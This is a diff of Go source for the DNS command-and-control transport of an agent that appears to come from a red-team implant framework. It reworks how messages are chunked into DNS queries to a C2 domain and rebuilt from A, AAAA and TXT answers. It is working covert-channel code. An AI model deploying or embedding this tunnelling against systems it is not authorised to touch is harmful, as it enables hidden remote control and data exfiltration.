@@ -449,7 +449,7 @@ func (c *C2DNS) SendMessage(sendData []byte) []byte {
 	} else {
 		sendData = append([]byte(UUID), sendData...) // Prepend the UUID
 	}
-	sendDataBase64 := base64.StdEncoding.EncodeToString(sendData)
+	//sendDataBase64 := base64.StdEncoding.EncodeToString(sendData)
 	// bail out of trying to send data after 5 failed attempts
 	for i := 0; i < 5; i++ {
 
@@ -464,7 +464,7 @@ func (c *C2DNS) SendMessage(sendData []byte) []byte {
 			os.Exit(1)
 		}
 		// send message
-		messageID := c.streamDNSPacketToServer(sendDataBase64)
+		messageID := c.streamDNSPacketToServer(sendData)
 		// get message
 		if messageID == 0 {
 			utils.PrintDebug(fmt.Sprintf("error sending message"))
@@ -472,23 +472,9 @@ func (c *C2DNS) SendMessage(sendData []byte) []byte {
 			c.Sleep()
 			continue
 		}
-		response := c.getDNSMessageFromServer(messageID)
-		if response == nil {
-			utils.PrintDebug(fmt.Sprintf("Got nil response"))
-			IncrementFailedConnection(c.ProfileName())
-			c.Sleep()
-			continue
-		}
-		//utils.PrintDebug(fmt.Sprintf("raw response: %s\n", string(response)))
-		raw, err := base64.StdEncoding.DecodeString(string(response))
-		if err != nil {
-			utils.PrintDebug(fmt.Sprintf("error base64.StdEncoding: %v\n", err))
-			IncrementFailedConnection(c.ProfileName())
-			c.Sleep()
-			continue
-		}
+		raw := c.getDNSMessageFromServer(messageID)
 		if len(raw) < 36 {
-			utils.PrintDebug(fmt.Sprintf("error len(raw) < 36: %v\n", err))
+			utils.PrintDebug(fmt.Sprintf("error len(raw) < 36: %v\n", len(raw)))
 			IncrementFailedConnection(c.ProfileName())
 			c.Sleep()
 			continue
@@ -498,7 +484,7 @@ func (c *C2DNS) SendMessage(sendData []byte) []byte {
 			enc_raw := c.decryptMessage(raw[36:])
 			if len(enc_raw) == 0 {
 				// failed somehow in decryption
-				utils.PrintDebug(fmt.Sprintf("error decrypt length wrong: %v\n", err))
+				utils.PrintDebug(fmt.Sprintf("error decrypt length wrong: %v\n", len(enc_raw)))
 				IncrementFailedConnection(c.ProfileName())
 				c.Sleep()
 				continue
@@ -546,7 +532,7 @@ func (c *C2DNS) getMaxLengthPerMessage(domain string) int {
 		MessageID:      math.MaxUint32,
 		Size:           math.MaxUint32,
 		Begin:          math.MaxUint32,
-		Data:           "",
+		Data:           nil,
 	}
 	jsonD, _ := proto.Marshal(d)
 	//jsonD, _ := json.Marshal(d)
@@ -599,33 +585,8 @@ func (c *C2DNS) adjustLocalAddress() {
 	}
 	dnsClient.Dialer.LocalAddr = nil
 	return
-	for _ = range c.localInterfaces {
-		c.currentLocalInterface = (c.currentLocalInterface + 1) % len(c.localInterfaces)
-		iface := c.localInterfaces[c.currentLocalInterface]
-		addrs, err := iface.Addrs()
-		if err != nil {
-			utils.PrintDebug(fmt.Sprintf("error getting local addresses: %v\n", err))
-			//dnsClient.Dialer.LocalAddr = nil
-			//return
-			continue
-		}
-		var localAddr *net.UDPAddr
-		for _, addr := range addrs {
-			if ipNet, ok := addr.(*net.IPNet); ok {
-				if ipNet.IP.To4() != nil {
-					localAddr = &net.UDPAddr{IP: ipNet.IP}
-					utils.PrintDebug(fmt.Sprintf("using local addr: %v\n", localAddr))
-					dnsClient.Dialer.LocalAddr = localAddr
-					return
-				}
-			}
-		}
-	}
-	utils.PrintDebug(fmt.Sprintf("no valid ips found at all, using nil local addr\n"))
-	dnsClient.Dialer.LocalAddr = nil
-	return
 }
-func (c *C2DNS) streamDNSPacketToServer(msg string) uint32 {
+func (c *C2DNS) streamDNSPacketToServer(msg []byte) uint32 {
 	sendingStream := &DnsMessageStream{
 		Size:       uint32(len(msg)),
 		Messages:   make(map[uint32]*dnsgrpc.DnsPacket),
@@ -646,8 +607,8 @@ func (c *C2DNS) streamDNSPacketToServer(msg string) uint32 {
 		}
 		sendingStream.TotalReceived = uint32(chunks)
 
-		utils.PrintDebug(fmt.Sprintf("sending message: Size (%d), Chunks (%d), dataLengthPerMessage: (%d), domain: (%s)\n",
-			sendingStream.Size, chunks, dataLengthPerMessage, domain))
+		//utils.PrintDebug(fmt.Sprintf("sending message: Size (%d), Chunks (%d), dataLengthPerMessage: (%d), domain: (%s)\n",
+		//	sendingStream.Size, chunks, dataLengthPerMessage, domain))
 		for i := 0; i < len(msg); i += dataLengthPerMessage {
 			sendingStream.Messages[uint32(i)] = &dnsgrpc.DnsPacket{
 				Action:         dnsgrpc.Actions_AgentToServer,
@@ -712,112 +673,48 @@ func (c *C2DNS) streamDNSPacketToServer(msg string) uint32 {
 				utils.PrintDebug(fmt.Sprintf("Failed to get successful response: %d, %s, %v", len(response.Answer), dns.Fqdn(finalData+domain), response))
 				continue
 			}
-			if len(response.Answer) != 4 {
+			if len(response.Answer) != 1 {
 				i-- // deprecate the count and try again
 				time.Sleep(1 * time.Second)
 				chunkErrors += 1
-				utils.PrintDebug(fmt.Sprintf("failed to get at least 4 response pieces: %d, %s, %v", len(response.Answer), dns.Fqdn(finalData+domain), response))
+				utils.PrintDebug(fmt.Sprintf("failed to get an answer response pieces: %d, %s, %v", len(response.Answer), dns.Fqdn(finalData+domain), response))
 				continue
 			}
-			ackValues := make([]dns.RR, len(response.Answer))
-			var ackAgentSessionID net.IP
-			var ackMessageID net.IP
-			var ackStartByte net.IP
 			var ackAction net.IP
-			badAnswers := false
-			for answerIndex := range response.Answer {
-				if response.Answer[answerIndex].Header().Ttl > uint32(len(ackValues)) {
-					chunkErrors += 1
-					utils.PrintDebug(fmt.Sprintf("Got 4 pieces, but TTL values are wrong: %d, %s, %v", len(response.Answer), dns.Fqdn(finalData+domain), response))
-					badAnswers = true
-					break
-				}
-				if ackValues[response.Answer[answerIndex].Header().Ttl] != nil {
-					utils.PrintDebug(fmt.Sprintf("Duplicate TTL detected %d", response.Answer[answerIndex].Header().Ttl))
-					badAnswers = true
-					break
-				}
-				ackValues[response.Answer[answerIndex].Header().Ttl] = response.Answer[answerIndex]
-			}
-			for index, _ := range ackValues {
-				if ackValues[index] == nil {
-					utils.PrintDebug(fmt.Sprintf("One of the values is nil, ackValues[%d]", index))
-					badAnswers = true
-				}
-			}
-			if badAnswers {
-				i-- // deprecate the count and try again
-				time.Sleep(1 * time.Second)
-				continue
-			}
+			var ackMessageString string
 			if c.getRequestType() == dns.TypeA {
-				ackAgentSessionID = ackValues[0].(*dns.A).A
-				ackMessageID = ackValues[1].(*dns.A).A
-				ackStartByte = ackValues[2].(*dns.A).A
-				ackAction = ackValues[3].(*dns.A).A
+				ackAction = response.Answer[0].(*dns.A).A
+				ackMessageString = response.Answer[0].(*dns.A).Hdr.Name
 			} else if c.getRequestType() == dns.TypeAAAA {
-				ackAgentSessionID = ackValues[0].(*dns.AAAA).AAAA
-				ackMessageID = ackValues[1].(*dns.AAAA).AAAA
-				ackStartByte = ackValues[2].(*dns.AAAA).AAAA
-				ackAction = ackValues[3].(*dns.AAAA).AAAA
+				ackAction = response.Answer[0].(*dns.AAAA).AAAA
+				ackMessageString = response.Answer[0].(*dns.AAAA).Hdr.Name
 			} else if c.getRequestType() == dns.TypeTXT {
-				ackAgentSessionID = make([]byte, net.IPv4len)
-				sessionID, err := strconv.Atoi(ackValues[0].(*dns.TXT).Txt[0])
-				if err != nil {
-					i--
-					utils.PrintDebug(fmt.Sprintf("failed to convert sessionID to int: %v\n", err))
-					continue
-				}
-				binary.LittleEndian.PutUint32(ackAgentSessionID, uint32(sessionID))
-
-				ackMessageID = make([]byte, net.IPv4len)
-				msgMessageID, _ := strconv.Atoi(ackValues[1].(*dns.TXT).Txt[0])
-				if err != nil {
-					i--
-					utils.PrintDebug(fmt.Sprintf("failed to convert msgMessageID to int: %v\n", err))
-					continue
-				}
-				binary.LittleEndian.PutUint32(ackMessageID, uint32(msgMessageID))
-
-				ackStartByte = make([]byte, net.IPv4len)
-				msgStartByte, _ := strconv.Atoi(ackValues[2].(*dns.TXT).Txt[0])
-				if err != nil {
-					i--
-					utils.PrintDebug(fmt.Sprintf("failed to convert msgStartByte to int: %v\n", err))
-					continue
-				}
-				binary.LittleEndian.PutUint32(ackStartByte, uint32(msgStartByte))
-
 				ackAction = make([]byte, net.IPv4len)
-				msgAction, _ := strconv.Atoi(ackValues[3].(*dns.TXT).Txt[0])
+				msgAction, _ := strconv.Atoi(response.Answer[0].(*dns.TXT).Txt[0])
 				if err != nil {
 					i--
 					utils.PrintDebug(fmt.Sprintf("failed to convert msgAction to int: %v\n", err))
 					continue
 				}
 				binary.LittleEndian.PutUint32(ackAction, uint32(msgAction))
+				ackMessageString = response.Answer[0].(*dns.TXT).Hdr.Name
 			} else {
-				// uh oh
-			}
-			if binary.LittleEndian.Uint32(ackAgentSessionID[:]) != sendingStream.Messages[sendingStream.StartBytes[i]].AgentSessionID {
-				i-- // somehow we got a message back that's not for our session id, try again
+				i--
+				utils.PrintDebug(fmt.Sprintf("unknown request type: %v\n", c.getRequestType()))
 				time.Sleep(100 * time.Millisecond)
 				continue
 			}
-			if binary.LittleEndian.Uint32(ackMessageID[:]) != sendingStream.Messages[sendingStream.StartBytes[i]].MessageID {
-				i-- // somehow we got a message back that's not for our session id, try again
+			if ackMessageString != dns.Fqdn(finalData+domain) {
+				// this is a response to something we didn't send, try again
+				i--
 				time.Sleep(100 * time.Millisecond)
 				continue
-			}
-			if !slices.Contains(ackStream.StartBytes, binary.LittleEndian.Uint32(ackStartByte[:])) {
-				// ack for something we already sent, just ignore it and move on
-				ackStream.StartBytes = append(ackStream.StartBytes, binary.LittleEndian.Uint32(ackStartByte[:]))
 			}
 			if binary.LittleEndian.Uint32(ackAction[:]) == uint32(dnsgrpc.Actions_ReTransmit) {
 				// something happened and the server is asking to retransmit the message
 				utils.PrintDebug(fmt.Sprintf("ReTransmit message: %v\n", sendingStream.Messages[sendingStream.StartBytes[i]].MessageID))
 				ackStream.StartBytes = make([]uint32, 0)
-				i = -1
+				i--
 			} else if binary.LittleEndian.Uint32(ackAction[:]) == uint32(dnsgrpc.Actions_ServerToAgent) {
 				i = chunks // just to make sure we get out of this loop
 				//utils.PrintDebug(fmt.Sprintf("Server got all message and has a response for us to fetch"))
@@ -829,15 +726,73 @@ func (c *C2DNS) streamDNSPacketToServer(msg string) uint32 {
 		c.increaseErrorCount(domain)
 	}
 }
-func removeTrailingNulls(b []byte) []byte {
+func removeTrailingBytes(b []byte) []byte {
 	// Start from the end of the slice
-	for i := len(b) - 1; i >= 0; i-- {
-		if b[i] != 0 {
-			return b[:i+1]
+	totalToRemove := b[len(b)-1]
+	return b[:len(b)-int(totalToRemove)]
+}
+func getActionAndBytesOrdered(responses *[]dns.RR) (action uint8, bytes []byte, err error) {
+	orderedResponses := make([][]byte, len(*responses))
+	finalBytes := make([]byte, 0)
+	action = uint8(0)
+	for _, rr := range *responses {
+		switch rr.Header().Rrtype {
+		case dns.TypeA:
+			// first byte of the IP is the order
+			data := rr.(*dns.A).A
+			//utils.PrintDebug(fmt.Sprintf("data: %v\n", data))
+			if int(data[0]) < len(orderedResponses) {
+				orderedResponses[data[0]] = data[1:]
+			} else {
+				utils.PrintDebug(fmt.Sprintf("ordering byte, %d, doesn't fit in len(orderedResponses): %d\n", data[0], len(orderedResponses)))
+				return action, nil, errors.New("ordering byte doesn't fit in len")
+			}
+			if data[0] == 0 {
+				action = data[net.IPv4len-1]
+			}
+		case dns.TypeAAAA:
+			// first byte of the IP is the order
+			data := rr.(*dns.AAAA).AAAA
+			//utils.PrintDebug(fmt.Sprintf("data: %v\n", data))
+			if int(data[0]) < len(orderedResponses) {
+				orderedResponses[data[0]] = data[1:]
+			} else {
+				utils.PrintDebug(fmt.Sprintf("ordering byte, %d, doesn't fit in len(orderedResponses): %d\n", data[0], len(orderedResponses)))
+				return action, nil, errors.New("ordering byte doesn't fit in len")
+			}
+			if data[0] == 0 {
+				action = data[net.IPv6len-1]
+			}
+		case dns.TypeTXT:
+			data := rr.(*dns.TXT).Txt
+			//utils.PrintDebug(fmt.Sprintf("data: %v\n", data))
+			if len(data) == 1 && len(data[0]) < 4 {
+				actionInt, err := strconv.Atoi(data[0])
+				if err != nil {
+					utils.PrintDebug(fmt.Sprintf("failed to convert string to int: %v\n", err))
+					return action, nil, err
+				}
+				action = uint8(actionInt)
+				orderedResponses[0] = []byte{action}
+			} else {
+				combinedStrings := strings.Join(data, "")
+				decodedData, err := base64.StdEncoding.DecodeString(combinedStrings)
+				if err != nil {
+					utils.PrintDebug(fmt.Sprintf("failed to decode base64 string: %v\n", err))
+					return action, nil, err
+				}
+				orderedResponses[1] = decodedData
+			}
 		}
 	}
-	// If all elements are zero, return an empty slice
-	return []byte{}
+	for i := 1; i < len(orderedResponses); i++ {
+		if orderedResponses[i] == nil {
+			// something went wrong, we're missing bytes in an ordered piece
+			return action, []byte{}, errors.New("ordering failed, missing responses")
+		}
+		finalBytes = append(finalBytes, orderedResponses[i]...)
+	}
+	return action, finalBytes, nil
 }
 func (c *C2DNS) getDNSMessageFromServer(messageID uint32) []byte {
 	receivingStream := &DnsMessageStream{
@@ -905,182 +860,44 @@ func (c *C2DNS) getDNSMessageFromServer(messageID uint32) []byte {
 			}
 			if response.Rcode != dns.RcodeSuccess {
 				time.Sleep(1 * time.Second)
+				utils.PrintDebug(fmt.Sprintf("Bad response code getting message from server: %d\n", response.Rcode))
 				c.increaseErrorCount(domain)
 				continue
 			}
-			if len(response.Answer) < 4 {
+			if len(response.Answer) < 1 {
 				time.Sleep(1 * time.Second)
 				c.increaseErrorCount(domain)
-				utils.PrintDebug(fmt.Sprintf("failed to get at least 4 response pieces: %d, %s", len(response.Answer), dns.Fqdn(finalData+domain)))
+				utils.PrintDebug(fmt.Sprintf("failed to get at least a response: %d, %s", len(response.Answer), dns.Fqdn(finalData+domain)))
 				continue
 			}
 			//utils.PrintDebug(fmt.Sprintf("response from server: %v\n", response))
-			ackValues := make([]dns.RR, len(response.Answer))
-			badAnswers := false
-			for answerIndex := range response.Answer {
-				if response.Answer[answerIndex].Header().Ttl > uint32(len(ackValues)) {
-					time.Sleep(1 * time.Second)
-					utils.PrintDebug(fmt.Sprintf("Got 4 pieces, but TTL values are wrong: %d, %s, %v", len(response.Answer), dns.Fqdn(finalData+domain), response))
-					badAnswers = true
-					break
-				}
-				if ackValues[response.Answer[answerIndex].Header().Ttl] != nil {
-					//utils.PrintDebug(fmt.Sprintf("Duplicate TTL detected %d, %v", response.Answer[answerIndex].Header().Ttl, response.Answer[answerIndex]))
-					badAnswers = true
-					break
-				}
-				ackValues[response.Answer[answerIndex].Header().Ttl] = response.Answer[answerIndex]
-			}
-			for index, _ := range ackValues {
-				if ackValues[index] == nil {
-					utils.PrintDebug(fmt.Sprintf("One of the values is nil, ackValues[%d]", index))
-					badAnswers = true
-				}
-			}
-			if badAnswers {
+			action, packetBytes, err := getActionAndBytesOrdered(&response.Answer)
+			if err != nil {
+				time.Sleep(1 * time.Second)
+				c.increaseErrorCount(domain)
+				utils.PrintDebug(fmt.Sprintf("failed to get proper response: %v, %v", err, response.Answer))
 				continue
 			}
-			packetBytes := make([]byte, 0)
-			var ackAgentSessionID net.IP
-			var ackMessageID net.IP
-			var ackStartByte net.IP
-			var ackAction net.IP
-
-			if c.getRequestType() == dns.TypeA {
-				ackAgentSessionID = ackValues[0].(*dns.A).A
-				ackMessageID = ackValues[1].(*dns.A).A
-				ackStartByte = ackValues[2].(*dns.A).A
-				ackAction = ackValues[3].(*dns.A).A
-				if binary.LittleEndian.Uint32(ackAgentSessionID[:]) != c.AgentSessionID {
-					// somehow we got a message back that's not for our session id, try again
-					time.Sleep(100 * time.Millisecond)
-					continue
-				}
-				if binary.LittleEndian.Uint32(ackMessageID[:]) != messageID {
-					// somehow we got a message back that's not for our session id, try again
-					time.Sleep(100 * time.Millisecond)
-					continue
-				}
-				if binary.LittleEndian.Uint32(ackAction[:]) == uint32(dnsgrpc.Actions_ReTransmit) {
-					// something happened and the server is asking to retransmit the message
-					utils.PrintDebug(fmt.Sprintf("ReTransmit message: %v\n", messageID))
-					receivingStream.StartBytes = make([]uint32, 0)
-				} else if binary.LittleEndian.Uint32(ackAction[:]) == uint32(dnsgrpc.Actions_MessageLost) {
-					utils.PrintDebug(fmt.Sprintf("Message lost on server: %v\n", messageID))
-					return nil
-				} else if slices.Contains(receivingStream.StartBytes, binary.LittleEndian.Uint32(ackStartByte[:])) {
-					// we've already received this one, continue on
-					continue
-				} else {
-					for j := 4; j < len(ackValues); j++ {
-						// now we're actually starting to get data from the response
-						packetBytes = append(packetBytes, ackValues[j].(*dns.A).A[:]...)
-					}
-				}
-			} else if c.getRequestType() == dns.TypeAAAA {
-				ackAgentSessionID = ackValues[0].(*dns.AAAA).AAAA
-				ackMessageID = ackValues[1].(*dns.AAAA).AAAA
-				ackStartByte = ackValues[2].(*dns.AAAA).AAAA
-				ackAction = ackValues[3].(*dns.AAAA).AAAA
-				if binary.LittleEndian.Uint32(ackAgentSessionID[:]) != c.AgentSessionID {
-					// somehow we got a message back that's not for our session id, try again
-					time.Sleep(100 * time.Millisecond)
-					continue
-				}
-				if binary.LittleEndian.Uint32(ackMessageID[:]) != messageID {
-					// somehow we got a message back that's not for our session id, try again
-					time.Sleep(100 * time.Millisecond)
-					continue
-				}
-				if binary.LittleEndian.Uint32(ackAction[:]) == uint32(dnsgrpc.Actions_ReTransmit) {
-					// something happened and the server is asking to retransmit the message
-					utils.PrintDebug(fmt.Sprintf("ReTransmit message: %v\n", messageID))
-					receivingStream.StartBytes = make([]uint32, 0)
-				} else if binary.LittleEndian.Uint32(ackAction[:]) == uint32(dnsgrpc.Actions_MessageLost) {
-					utils.PrintDebug(fmt.Sprintf("Message lost on server: %v\n", messageID))
-					return nil
-				} else if slices.Contains(receivingStream.StartBytes, binary.LittleEndian.Uint32(ackStartByte[:])) {
-					// we've already received this one, continue on
-					continue
-				} else {
-					for j := 4; j < len(ackValues); j++ {
-						// now we're actually starting to get data from the response
-						packetBytes = append(packetBytes, ackValues[j].(*dns.AAAA).AAAA[:]...)
-					}
-				}
-			} else if c.getRequestType() == dns.TypeTXT {
-				ackAgentSessionID = make([]byte, net.IPv4len)
-				sessionID, err := strconv.Atoi(ackValues[0].(*dns.TXT).Txt[0])
-				if err != nil {
-					utils.PrintDebug(fmt.Sprintf("failed to convert sessionID to int: %v\n", err))
-					continue
-				}
-				binary.LittleEndian.PutUint32(ackAgentSessionID, uint32(sessionID))
-
-				ackMessageID = make([]byte, net.IPv4len)
-				msgMessageID, _ := strconv.Atoi(ackValues[1].(*dns.TXT).Txt[0])
-				if err != nil {
-					utils.PrintDebug(fmt.Sprintf("failed to convert msgMessageID to int: %v\n", err))
-					continue
-				}
-				binary.LittleEndian.PutUint32(ackMessageID, uint32(msgMessageID))
-
-				ackStartByte = make([]byte, net.IPv4len)
-				msgStartByte, _ := strconv.Atoi(ackValues[2].(*dns.TXT).Txt[0])
-				if err != nil {
-					utils.PrintDebug(fmt.Sprintf("failed to convert msgStartByte to int: %v\n", err))
-					continue
-				}
-				binary.LittleEndian.PutUint32(ackStartByte, uint32(msgStartByte))
-
-				ackAction = make([]byte, net.IPv4len)
-				msgAction, _ := strconv.Atoi(ackValues[3].(*dns.TXT).Txt[0])
-				if err != nil {
-					utils.PrintDebug(fmt.Sprintf("failed to convert msgAction to int: %v\n", err))
-					continue
-				}
-				binary.LittleEndian.PutUint32(ackAction, uint32(msgAction))
-
-				if binary.LittleEndian.Uint32(ackAgentSessionID[:]) != c.AgentSessionID {
-					// somehow we got a message back that's not for our session id, try again
-					time.Sleep(100 * time.Millisecond)
-					continue
-				}
-				if binary.LittleEndian.Uint32(ackMessageID[:]) != messageID {
-					// somehow we got a message back that's not for our session id, try again
-					time.Sleep(100 * time.Millisecond)
-					continue
-				}
-				if binary.LittleEndian.Uint32(ackAction[:]) == uint32(dnsgrpc.Actions_ReTransmit) {
-					// something happened and the server is asking to retransmit the message
-					utils.PrintDebug(fmt.Sprintf("ReTransmit message: %v\n", messageID))
-					receivingStream.StartBytes = make([]uint32, 0)
-				} else if binary.LittleEndian.Uint32(ackAction[:]) == uint32(dnsgrpc.Actions_MessageLost) {
-					utils.PrintDebug(fmt.Sprintf("Message lost on server: %v\n", messageID))
-					return nil
-				} else if slices.Contains(receivingStream.StartBytes, binary.LittleEndian.Uint32(ackStartByte[:])) {
-					// we've already received this one, continue on
-					continue
-				} else {
-					for j := 4; j < len(ackValues); j++ {
-						// now we're actually starting to get data from the response
-						answer := ackValues[j].(*dns.TXT).Txt
-						msgBytes := ""
-						for _, k := range answer {
-							msgBytes += k
-						}
-						decodedBytes, _ := base64.StdEncoding.DecodeString(msgBytes)
-						packetBytes = append(packetBytes, decodedBytes...)
-					}
-				}
-			} else {
-
+			if action == uint8(dnsgrpc.Actions_ReTransmit) {
+				utils.PrintDebug(fmt.Sprintf("ReTransmit message: %v\n", messageID))
+				receivingStream.StartBytes = make([]uint32, 0)
+				continue
+			} else if action == uint8(dnsgrpc.Actions_MessageLost) {
+				utils.PrintDebug(fmt.Sprintf("Message lost on server: %v\n", messageID))
+				return nil
+			} else if dns.Fqdn(finalData+domain) != response.Answer[0].Header().Name {
+				utils.PrintDebug(fmt.Sprintf("got a message that doesn't match what we sent: %v\n", response))
+				time.Sleep(1 * time.Second)
+				continue
 			}
-
 			receivedPacket := &dnsgrpc.DnsPacket{}
-			err = proto.Unmarshal(removeTrailingNulls(packetBytes), receivedPacket)
+			if c.getRequestType() == dns.TypeTXT {
+				err = proto.Unmarshal(packetBytes, receivedPacket)
+			} else {
+				err = proto.Unmarshal(removeTrailingBytes(packetBytes), receivedPacket)
+			}
 			if err != nil {
-				utils.PrintDebug(fmt.Sprintf("failed to unmarshal received packet: %v\n", err))
+				utils.PrintDebug(fmt.Sprintf("failed to unmarshal received packet: %v\n%v", err, packetBytes))
 				time.Sleep(1 * time.Second)
 				c.increaseErrorCount(domain)
 				continue
@@ -1091,17 +908,15 @@ func (c *C2DNS) getDNSMessageFromServer(messageID uint32) []byte {
 			receivingStream.Messages[receivedPacket.Begin] = receivedPacket
 			lastChunk += uint32(len(receivedPacket.Data))
 			if receivingStream.Size == receivedPacket.Size {
-				utils.PrintDebug(fmt.Sprintf("receive message: Size (%d), Chunks (%d)", receivedPacket.Size, len(receivingStream.StartBytes)))
-				totalBuffer := ""
+				utils.PrintDebug(fmt.Sprintf("received message: Size (%d), Chunks (%d)", receivedPacket.Size, len(receivingStream.StartBytes)))
+				totalBuffer := make([]byte, receivedPacket.Size)
 				// sort all the start bytes to be in order
 				sort.Slice(receivingStream.StartBytes, func(i, j int) bool { return i < j })
 				// iterate over the start bytes and add the corresponding string data together
 				for i := 0; i < len(receivingStream.StartBytes); i++ {
-					totalBuffer += receivingStream.Messages[receivingStream.StartBytes[i]].Data
+					copy(totalBuffer[receivingStream.Messages[receivingStream.StartBytes[i]].Begin:], receivingStream.Messages[receivingStream.StartBytes[i]].Data)
 				}
-				// we got the whole message
-				//utils.PrintDebug(fmt.Sprintf("got the whole message: %v\n", totalBuffer))
-				return []byte(totalBuffer)
+				return totalBuffer
 			}
 			break
 		}
